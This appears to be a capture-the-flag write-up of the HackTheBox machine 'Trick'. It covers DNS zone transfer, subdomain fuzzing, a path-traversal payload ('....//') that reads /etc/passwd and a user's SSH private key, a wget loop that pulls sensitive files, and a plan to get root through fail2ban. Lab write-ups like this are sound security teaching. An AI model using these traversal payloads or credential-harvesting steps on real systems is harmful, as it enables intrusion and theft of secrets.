IP: 10.10.11.166

Tester: LifeTimeScriptKiddie
Target: trick.htb - 10.10.11.166
Used tools: nmap, gobuster, ffuf, wfuzz, dig, nslookup, host, dnsrecon

Vulnerability: 
DNS setup misconfiguration revealed two pre-production web pages.
One pre-production web page has a directory traversal vulnerability. 
The tester used directory traversal vulnerability on one web page and gained user credentials (Username and ssh). The tester gained system root access using a misconfiguration of the installed third-party application. 

Recommendation: 
The most significant vulnerability is the misconfiguration of DNS. The tester highly recommends restricting DNS zone transfer. 

Key takeaway from the box 
1. Zone Transfer (dig, etc.)
2. Tool options - (wfuzz vs fuzz)
3. A quick bash scripting. 


# 1. Technical details

## Port scanning with nmap. 
```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
...snip...

25/tcp open  smtp    Postfix smtpd
...snip...

53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
...snip...

80/tcp open  http    nginx 1.14.2
...snip...

```

## Attack vector planning
The tester decided to check in order 22, 25, 53, and 80.


		22 : SSH - Need Credential. 22 Usually requires SSH credentials. Brute forcing usually doesn't work well. 
		25 : SMTP  - Checked with using nmap --script smtp* 10.10.11.166
				No significant indication for me to jump in. 
		53 : DNS 
			dig <webpage>
			dig axfr <website.com> @<name-server>
			dig axfr <website> @<IP>
			dig +short ns <url>
			fierce -nds <domain>
			host -l <test-url> <name-server>
			nslookup 
				server <name-server>
				set type=any
				ls -d <test-url>
			dnsrecon -d <website> -t axfr
			whois <ip>
			dnscan -d <domain> -w <subdomain.txt>
			https://github.com/rbsec/dnscan
	
		80 : HTTP


### Port 53 - DNS Enumeration
``` 
with dig Command, the hidden website - preprod-payroll.trick.htb
	dig axfr <website> @<IP>
; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 115 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Fri Oct 28 13:00:42 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)


with fierce command
	--domain 10.10.11.166
	Didn't have much information

with host -l 
	No luck
with nslookup
	server
	set type=any
dnsrecon -d trick.htb -t axfr
	Zone Transfer Failed. 
	
	
	


```

dig returns preprod-payroll.trick.htb. 
Preprod might indicates the webpage is a preproduction website.
For now, I will keep this on the side and move on to port 80. 

### Port 80 - HTTP

Added trick.htb to /etc/hosts.

The webpage does not have much information. 

```
$ http  http://trick.htb/|xclip -selection clipboard


<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Coming Soon - Start Bootstrap Theme</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
...snip...
...snip...
...snip...

        <!-- * * Activate your form at https://startbootstrap.com/solution/contact-forms * *-->
        <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
        <script src="https://cdn.startbootstrap.com/sb-forms-latest.js"></script>
    </body>
</html>

```

I entered a bogus email, scriptkiddie@lifetime.com
The following indicator shows up. 
```
Form submission successful!

To activate this form, sign up at  
[https://startbootstrap.com/solution/contact-forms](https://startbootstrap.com/solution/contact-forms)
```

Recommendation: **Don't launch an attack against that website - https://startbootstrap.com/solution/contact-forms**. 




I was not able to making progress on that website. 

Time to fuzz. The page didn't like gobuster, so used ffuf. 
```
gobuster dir -url http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

Error: the server returns a status code that matches the provided options for non existing urls. http://rl/5eb9391f-b368-4db9-8036-b5fd17888b0c => 200 (Length: 390). To continue please exclude the status code or the length

```

ffuf returns some directories but not usuable. CSS and JS are common language for frontend websites. 
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.10.11.166/FUZZ| tee fuff


css                     [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 26ms][0m
js                      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 36ms][0m
assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 26ms][0m

```

## Port 80 - Fuzzing with wfuzz, ffuf. 

Decided to dig more preprod-payroll.trick.htb address. 

Fuzzed **preprod-FUZZ.trick.htb** using ffuf and wfuzz. 

For whatever reason, the ffuf didn't show much result other than preprod-payroll, which is already known. 

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://preprod-FUZZ.trick.htb| tee fuff.preprod-FUZZ`

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt 
-u http://trick.htb -H "HOST :preprod-FUZZ.trick.htb" -fs 5480

-H is the header "name: Value" Once specifiy the header value, the tool worked. Don't know why. 
```





Instead of trying harder. Decided to trying smarter with fuzzer.

```

Wfuzzer 
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83 

payroll
marketing
```




Three subpages were identified. With this format, the first thing I usually try is directory traversal. The manual ../../../../etc/passwd didn't work. So wfuzz was used to do search for local file inclusion. 
```
http://preprod-marketing.trick.htb/index.php?page=services.html
http://preprod-marketing.trick.htb/index.php?page=about.html
http://preprod-marketing.trick.htb/index.php?page=contact.html


```


/etc/passwd was located with wfuzz. From the /etc/passwd, a valid username, michael, was received. 

 Used bash scripting to download sensitve and common files, such as /etc/passwd, id_rsa, etc. 


```
└─$ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//FUZZ --hw 0 >> LFI.Marketing.linux_all

─$ cat LFI.Marketing.linux_all|grep /etc/passwd
000000398:   200        42 L     69 W       2397 Ch     "/etc/passwd-"  


└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' >> files.txt
└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i root >> sensitive_files.txt
└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i home >> sensitive_files.txt

From vim:
:%s!\~/!/home/michael/!                                                                                                                                 



$ while read -r line; do wget http://preprod-marketing.trick.htb/index.php?page=....//....//....//..../"$line"  ; done <  ../sensitive_files.txt



```




## System Access via ssh and  PE via third party application. 
One of the output from the bash scripting was michael's id_rsa. 
```
0408  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa'
4860433  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:48 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.1'
4860406  4 -rw-r--r-- 1 kali kali   395 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.pub'
4860431  4 -rw-r--r-- 1 kali kali   395 Oct 30 19:48 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.pub.1'
4860392  0 -rw-r--r-- 1 kali kali     0 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2Fstable%2Fapache%2Fphp.ini'

```

The tester was able to gain system access as non-root user after the file permission was 
changed to 600. 

```
└─$ ssh michael@10.10.11.166 -i id_rsa
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
michael@10.10.11.166's password: 

└─$ chmod 600 ./id_rsa                                                                 


```


Once logged in, I followed the usual Linux PE from my previous note. 
https://app.gitbook.com/s/-MdC6F2qPks25QX5I3wr/oscp_prep/3.-linux-pe
So generally, I start with the user, group, privileges, etc. Then, I check for services, weak file permission, sudo, cronjobs, suid/sgid, other files,  kernel versions, then network connections.  In this case, sudo -l revealed that the user michael has authority to restart fail2ban service. 


```
michael@trick:~$ sudo -lgroup

    (root) NOPASSWD: /etc/init.d/fail2ban restart



michael@trick:~$ groups
michael security

```

The user was in security group and the fail2ban configuration folder, action.d, is a part of the security group. 

https://research.securitum.com/fail2ban-remote-code-execution/

According to the above website, it seems like I need to find a file that will be triggered on update actionban variable. Then, trigger it by enforcing banned behavior. 

```
michael@trick:/etc/fail2ban$ ls -lisa
total 76
264287  4 drwxr-xr-x   6 root root      4096 Oct 31 13:54 .
130561 12 drwxr-xr-x 126 root root     12288 Oct 31 13:44 ..
269281  4 drwxrwx---   2 root security  4096 Oct 31 13:54 action.d

```


Since the user michael don't have write privilige on that folder, I copy the file to the my working folder and modfiy the variable and copy back to the /etc/fail2ban/action.d location.
Then trigger the updated variable by forcing wrong ssh login attempts. 


